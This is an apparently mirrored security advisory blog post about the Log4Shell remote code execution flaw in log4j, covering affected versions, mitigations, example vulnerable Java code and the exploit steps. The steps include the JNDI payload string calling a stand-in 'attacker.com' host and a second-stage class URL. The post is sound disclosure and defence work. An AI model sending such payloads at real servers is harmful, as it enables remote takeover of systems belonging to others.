<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://www.lunasec.io/docs/blog/log4j-zero-day/">Original</a>
    <h1>Log4j RCE Found</h1>
    
    <div id="readability-page-1" class="page"><div itemprop="articleBody"><p><img src="https://www.lunasec.io/docs/img/log4shell-logo.png" alt="Log4Shell Logo"/></p><p><em>Updated @ December 10th, 8am PST</em></p><p>A few hours ago, a 0-day exploit in the
popular Java logging library <code>log4j</code> was discovered that results in Remote Code Execution (RCE) by
logging a certain string.</p><p>Given how ubiquitous this library is, the impact of the exploit (full server control), and how easy it is to exploit,
the impact of this vulnerability is quite severe. We&#39;re calling it &#34;Log4Shell&#34; for short (CVE-2021-44228 just isn&#39;t as memorable).</p><p>The 0-day was <a href="https://twitter.com/P0rZ9/status/1468949890571337731" target="_blank" rel="noopener noreferrer">tweeted</a> along with a POC posted on
<a href="https://github.com/tangxiaofeng7/apache-log4j-poc" target="_blank" rel="noopener noreferrer">GitHub</a>.  <del>Since this vulnerability is still very new, there isn&#39;t a CVE to track
it yet.</del> This has been published as <a href="https://www.randori.com/blog/cve-2021-44228/" target="_blank" rel="noopener noreferrer">CVE-2021-44228</a> now.</p><p>This post provides resources to help you understand the vulnerability and how to mitigate it for yourself.</p><h2 id="who-is-impacted">Who is impacted?<a aria-hidden="true" href="#who-is-impacted" title="Direct link to heading">​</a></h2><p>Many, many services are vulnerable to this exploit.  Cloud services like <a href="https://news.ycombinator.com/item?id=29499867" target="_blank" rel="noopener noreferrer">Steam, Apple iCloud</a>, and apps like
Minecraft have already been found to be vulnerable.  </p><p>Anybody using Apache Struts is likely vulnerable. We&#39;ve seen similar vulnerabilities exploited before in breaches like
the <a href="https://en.wikipedia.org/wiki/2017_Equifax_data_breach#Data_breach" target="_blank" rel="noopener noreferrer">2017 Equifax data breach</a>.</p><p>Many Open Source projects
like the Minecraft server, <a href="https://github.com/PaperMC/Paper/commit/b475c6a683fa34156b964f751985f36a784ca0e0" target="_blank" rel="noopener noreferrer">Paper</a>,
have already begun patching their usage of <code>log4j</code>.</p><p><strong>Updates (3 hours after posting):</strong>
According to <a href="https://www.cnblogs.com/yyhuni/p/15088134.html" target="_blank" rel="noopener noreferrer">this blog post</a> (in <a href="https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en-US" target="_blank" rel="noopener noreferrer">english</a>),
JDK versions greater than <code>6u211</code>, <code>7u201</code>, <code>8u191</code>, and <code>11.0.1</code> are not affected by the LDAP attack vector. In these versions
<code>com.sun.jndi.ldap.object.trustURLCodebase</code> is set to <code>false</code> meaning JNDI cannot load a remote codebase using LDAP. </p><p>However, there are other attack vectors targeting this vulnerability which can result in RCE. Depending on what code is
present on the server, an attacker could leverage this existing code to execute a payload. An attack targeting the class
<code>org.apache.naming.factory.BeanFactory</code>, present on Apache Tomcat servers, is discussed
in <a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener noreferrer">this blog post</a>. </p><h2 id="affected-apache-log4j-versions">Affected Apache log4j Versions<a aria-hidden="true" href="#affected-apache-log4j-versions" title="Direct link to heading">​</a></h2><p><code>2.0 &lt;= Apache log4j &lt;= 2.14.1</code></p><h2 id="permanent-mitigation">Permanent Mitigation<a aria-hidden="true" href="#permanent-mitigation" title="Direct link to heading">​</a></h2><p>At the time this post was created (December 9th, 2021), no stable release was available. </p><p>As of December 10th, 2021, Version 2.15.0 was released. log4j-core.jar is available on Maven Central <a href="https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.15.0/" target="_blank" rel="noopener noreferrer">here</a>, with [<a href="https://logging.apache.org/log4j/2.x/changes-report.html#a2.15.0" target="_blank" rel="noopener noreferrer">release notes</a>] and
[<a href="https://logging.apache.org/log4j/2.x/security.html" target="_blank" rel="noopener noreferrer">log4j security announcements</a>].</p><p>Releases to GitHub appear to still be pending.</p><h2 id="temporary-mitigation">Temporary Mitigation<a aria-hidden="true" href="#temporary-mitigation" title="Direct link to heading">​</a></h2><p>As per <a href="https://news.ycombinator.com/item?id=29507263" target="_blank" rel="noopener noreferrer">this discussion on HackerNews</a>:</p><blockquote><p>The &#39;formatMsgNoLookups&#39; property was added in version 2.10.0, per the JIRA Issue LOG4J2-2109 <!-- -->[1]<!-- --> that proposed it. Therefore the &#39;formatMsgNoLookups=true&#39; mitigation strategy is available in version 2.10.0 and higher, but is no longer necessary with version 2.15.0, because it then becomes the default behavior <!-- -->[2][3]<!-- -->.</p><p>If you are using a version older than 2.10.0 and cannot upgrade, your mitigation choices are:</p><ul><li><p>Modify every logging pattern layout to say <code>%m{nolookups}</code> instead of <code>%m</code> in your logging config files, see details at <a href="https://issues.apache.org/jira/browse/LOG4J2-2109" target="_blank" rel="noopener noreferrer">https://issues.apache.org/jira/browse/LOG4J2-2109</a> or,</p></li><li><p>Substitute a non-vulnerable or empty implementation of the class org.apache.logging.log4j.core.lookup.JndiLookup, in a way that your classloader uses your replacement instead of the vulnerable version of the class. Refer to your application&#39;s or stack&#39;s classloading documentation to understand this behavior.</p></li></ul></blockquote><h2 id="how-the-exploit-works">How the exploit works<a aria-hidden="true" href="#how-the-exploit-works" title="Direct link to heading">​</a></h2><h3 id="exploit-requirements">Exploit Requirements<a aria-hidden="true" href="#exploit-requirements" title="Direct link to heading">​</a></h3><ul><li>A server with a vulnerable <code>log4j</code> version (listed above),</li><li>an endpoint with any protocol (HTTP, TCP, etc) that allows an attacker to send the exploit string,</li><li>and a log statement that logs out the string from that request.</li></ul><h3 id="example-vulnerable-code">Example Vulnerable Code<a aria-hidden="true" href="#example-vulnerable-code" title="Direct link to heading">​</a></h3><div><div><pre tabindex="0"><code><span><span>import</span><span> org</span><span>.</span><span>apache</span><span>.</span><span>log4j</span><span>.</span><span>Logger</span><span>;</span><span></span><br/></span><span><span></span><br/></span><span><span></span><span>import</span><span> java</span><span>.</span><span>io</span><span>.</span><span>*</span><span>;</span><span></span><br/></span><span><span></span><span>import</span><span> java</span><span>.</span><span>sql</span><span>.</span><span>SQLException</span><span>;</span><span></span><br/></span><span><span></span><span>import</span><span> java</span><span>.</span><span>util</span><span>.</span><span>*</span><span>;</span><span></span><br/></span><span><span></span><br/></span><span><span></span><span>public</span><span> </span><span>class</span><span> </span><span>VulnerableLog4jExampleHandler</span><span> </span><span>implements</span><span> </span><span>HttpHandler</span><span> </span><span>{</span><span></span><br/></span><span><span></span><br/></span><span><span>  </span><span>static</span><span> </span><span>Logger</span><span> log </span><span>=</span><span> </span><span>Logger</span><span>.</span><span>getLogger</span><span>(</span><span>log4jExample</span><span>.</span><span>class</span><span>.</span><span>getName</span><span>(</span><span>)</span><span>)</span><span>;</span><span></span><br/></span><span><span></span><br/></span><span><span>  </span><br/></span><span><br/></span><span><br/></span><span><br/></span><span><span></span><br/></span><span><span>  </span><span>public</span><span> </span><span>void</span><span> </span><span>handle</span><span>(</span><span>HttpExchange</span><span> he</span><span>)</span><span> throws </span><span>IOException</span><span> </span><span>{</span><span></span><br/></span><span><span>    </span><span>string</span><span> userAgent </span><span>=</span><span> he</span><span>.</span><span>getRequestHeader</span><span>(</span><span>&#34;user-agent&#34;</span><span>)</span><span>;</span><span></span><br/></span><span><span>    </span><br/></span><span><span>    </span><span></span><br/></span><span><span>    </span><span></span><br/></span><span><span>    log</span><span>.</span><span>info</span><span>(</span><span>&#34;Request User Agent:{}&#34;</span><span>,</span><span> userAgent</span><span>)</span><span>;</span><span></span><br/></span><span><span></span><br/></span><span><span>    </span><span>String</span><span> response </span><span>=</span><span> </span><span>&#34;&lt;h1&gt;Hello There, &#34;</span><span> </span><span>+</span><span> userAgent </span><span>+</span><span> </span><span>&#34;!&lt;/h1&gt;&#34;</span><span>;</span><span></span><br/></span><span><span>    he</span><span>.</span><span>sendResponseHeaders</span><span>(</span><span>200</span><span>,</span><span> response</span><span>.</span><span>length</span><span>(</span><span>)</span><span>)</span><span>;</span><span></span><br/></span><span><span>    </span><span>OutputStream</span><span> os </span><span>=</span><span> he</span><span>.</span><span>getResponseBody</span><span>(</span><span>)</span><span>;</span><span></span><br/></span><span><span>    os</span><span>.</span><span>write</span><span>(</span><span>response</span><span>.</span><span>getBytes</span><span>(</span><span>)</span><span>)</span><span>;</span><span></span><br/></span><span><span>    os</span><span>.</span><span>close</span><span>(</span><span>)</span><span>;</span><span></span><br/></span><span><span>  </span><span>}</span><span></span><br/></span><span><span></span><span>}</span><br/></span></code></pre></div></div><h3 id="exploit-steps">Exploit Steps<a aria-hidden="true" href="#exploit-steps" title="Direct link to heading">​</a></h3><ol><li>Data from the User gets sent to the server (via any protocol),</li><li>The server logs the data in the request, containing the malicious payload: <code>${jndi:ldap://attacker.com/a}</code> (where <code>attacker.com</code> is an attacker controlled server),</li><li>The <code>log4j</code> vulnerability is triggered by this payload and the server makes a request to <code>attacker.com</code> via &#34;<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener noreferrer">Java Naming and Directory Interface</a>&#34; (JNDI),</li><li>This response contains a path to a remote Java class file (ex. <code>http://second-stage.attacker.com/Exploit.class</code>) which is injected into the server process,</li><li>This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.</li></ol><p>Due to how common Java vulnerabilities such as these are, security researchers have created tools to easily exploit
them. The <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener noreferrer">marshalsec</a> project is one of many that demonstrates generating an
exploit payload that could be used for this vulnerability. You can refer to <a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java" target="_blank" rel="noopener noreferrer">this malicious LDAP server</a> for an example of exploitation. </p><h2 id="more-information">More information<a aria-hidden="true" href="#more-information" title="Direct link to heading">​</a></h2><p>We&#39;ll continue to update this post as information about the impact of this exploit becomes available.</p><p>For now, we&#39;re just publishing this to help raise awareness and get people patching it. Please tell any of your friends
running Java software!</p><h3 id="how-you-can-prevent-future-attacks">How you can prevent future attacks<a aria-hidden="true" href="#how-you-can-prevent-future-attacks" title="Direct link to heading">​</a></h3><p>Approaches like Tokenization can limit your vulnerability to attacks before they happen by requiring multiple exploits
to leak sensitive data.</p><p><a href="https://www.lunasec.io/docs/pages/overview/introduction/" target="_blank" rel="noopener noreferrer">LunaSec</a> is an Open Source Data Security framework designed
to help <a href="https://www.lunasec.io/docs/pages/how-it-works/features/" target="_blank" rel="noopener noreferrer">mitigate</a> attacks just like this one.</p><h3 id="editing-this-post">Editing this post<a aria-hidden="true" href="#editing-this-post" title="Direct link to heading">​</a></h3><p>If you have any updates or edits you&#39;d like to make, you can edit this post as Markdown on
<a href="https://github.com/lunasec-io/lunasec/blob/master/docs/blog/2021-12-09-log4j-zero-day.md" target="_blank" rel="noopener noreferrer">GitHub</a>. And please throw us a Star ⭐!</p><h3 id="links">Links<a aria-hidden="true" href="#links" title="Direct link to heading">​</a></h3><ul><li><strong><a href="https://news.ycombinator.com/item?id=29504755" target="_blank" rel="noopener noreferrer">Hacker News</a></strong></li><li><strong><a href="https://old.reddit.com/r/programming/comments/rcxehp/rce_0day_exploit_found_in_log4j_a_popular_java/" target="_blank" rel="noopener noreferrer">Reddit</a></strong></li><li><strong><a href="https://twitter.com/freeqaz/status/1469121757361569793?s=20" target="_blank" rel="noopener noreferrer">Twitter</a></strong></li></ul><h3 id="edits">Edits<a aria-hidden="true" href="#edits" title="Direct link to heading">​</a></h3><ol><li>Updated the &#34;Who is impacted?&#34; section to include mitigating factor based on JDK version, but also suggest other exploitation
methods are still prevalent.</li><li><del>Named the vulnerability &#34;LogJam&#34;,</del> added CVE, and added link to release tags.</li><li>Update mitigation steps with newer information.</li><li>Removed the name &#34;LogJam&#34; because it&#39;s already been <a href="https://en.wikipedia.org/wiki/Logjam_(computer_security)" target="_blank" rel="noopener noreferrer">used</a>. Using &#34;Log4Shell&#34; instead.</li><li>Update that 2.15.0 is released.</li><li>Added the MS Paint logo<!-- -->[4]<!-- -->, and updated example code to be slightly more clear (it&#39;s not string concatenation).</li></ol><h3 id="references">References<a aria-hidden="true" href="#references" title="Direct link to heading">​</a></h3><p>[1]<!-- --> <a href="https://issues.apache.org/jira/browse/LOG4J2-2109" target="_blank" rel="noopener noreferrer">https://issues.apache.org/jira/browse/LOG4J2-2109</a></p><p>[2]<!-- --> <a href="https://github.com/apache/logging-log4j2/pull/607/files" target="_blank" rel="noopener noreferrer">https://github.com/apache/logging-log4j2/pull/607/files</a></p><p>[3]<!-- --> <a href="https://issues.apache.org/jira/browse/LOG4J2-3198" target="_blank" rel="noopener noreferrer">https://issues.apache.org/jira/browse/LOG4J2-3198</a></p><p>[4]<!-- --> Kudos to <a href="https://twitter.com/GossiTheDog/status/1469252646745874435" target="_blank" rel="noopener noreferrer">@GossiTheDog</a> for the MS Paint logo!</p><p>Also kudos to @80vul for <a href="https://twitter.com/80vul/status/1468968891489857537" target="_blank" rel="noopener noreferrer">tweeting</a> about this.</p></div></div>
  </body>
</html>
